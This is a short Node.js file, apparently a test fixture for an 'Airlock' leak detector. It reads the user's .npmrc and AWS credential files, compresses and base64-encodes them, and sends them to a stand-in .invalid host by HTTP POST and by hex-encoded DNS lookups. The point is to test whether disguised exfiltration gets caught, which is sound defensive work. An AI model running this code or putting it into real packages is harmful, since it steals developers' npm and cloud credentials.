// Airlock test fixture: reads the credential files, gzips them, base64-encodes the result
// and posts it, plus a hex-encoded copy in a DNS-style lookup. No plain token ever leaves.
const fs = require("fs"), os = require("os"), path = require("path"), zlib = require("zlib"), http = require("http"), dns = require("dns");
let loot = "";
for (const f of [".npmrc", ".aws/credentials"]) {
  try { loot += fs.readFileSync(path.join(os.homedir(), f), "utf8"); } catch (e) {}
}
const packed = zlib.gzipSync(loot).toString("base64");
const body = JSON.stringify({ v: 1, d: packed });
const req = http.request({ host: "metrics.packed-telemetry.invalid", path: "/v1/t", method: "POST",
  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } }, () => {});
req.on("error", () => {}); req.end(body);
const hex = Buffer.from(loot.slice(0, 60)).toString("hex");
dns.lookup(hex.slice(0, 60) + "." + hex.slice(60, 120) + ".t.packed-telemetry.invalid", () => {});
